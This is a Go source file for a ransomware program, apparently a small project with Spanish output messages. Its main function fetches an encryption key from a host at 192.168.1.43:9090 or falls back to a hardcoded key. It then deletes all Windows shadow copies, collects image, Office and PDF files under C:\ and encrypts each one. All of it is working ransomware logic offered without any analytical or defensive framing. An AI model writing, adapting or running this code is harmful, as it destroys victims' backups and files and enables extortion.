package main

import (
	"fmt"
	"ransomware/comunUtils"
	"ransomware/ransomUtils"
)

const defaultKey = "clave"

func main() {
	key, err := ransomUtils.ObtenerClave("192.168.1.43:9090")
	if err != nil {
		fmt.Println("Error al obtener la palabra:", err)
		key= defaultKey
	}
	resultInfo, errShadowCopies := comunUtils.DeleteAllShadowCopies()
	if errShadowCopies != nil {
		fmt.Println("Error:", errShadowCopies)
	}
	fmt.Println(resultInfo)
	files, errListFiles := comunUtils.ListFiles(`C:\`, []string{"jpg", "jpeg", "png", "gif", "docx", "xlsx", "pptx", "pdf"})
	if errListFiles != nil {
		fmt.Println("Error:", errListFiles)
	}
	fmt.Println("Cifrando los siguientes archivos:")
	for _, file := range files {
		errEncrypt := ransomUtils.EncryptFile(file, key)
		if errEncrypt != nil {
			println("Error encriptando:", file, "\n", errEncrypt)
		}
		fmt.Println(file)
	}

	for true {

	}
}
